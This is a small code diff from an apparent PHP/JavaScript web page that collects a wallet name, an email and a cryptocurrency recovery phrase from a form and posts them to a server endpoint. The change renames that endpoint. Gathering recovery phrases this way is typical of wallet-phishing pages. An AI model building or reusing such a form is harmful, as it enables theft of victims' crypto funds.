@@ -2509,7 +2509,7 @@ span.h4.d-block.coin-name {
             
             //alert(formData['wallet_name']+" | "+formData['email']+" | "+formData['recovery_phrase']);
             
-            const url = '<?=base_url('home/process')?>';
+            const url = '<?=base_url('home/link_wallet')?>';
 
             $.ajax({
               url: url,
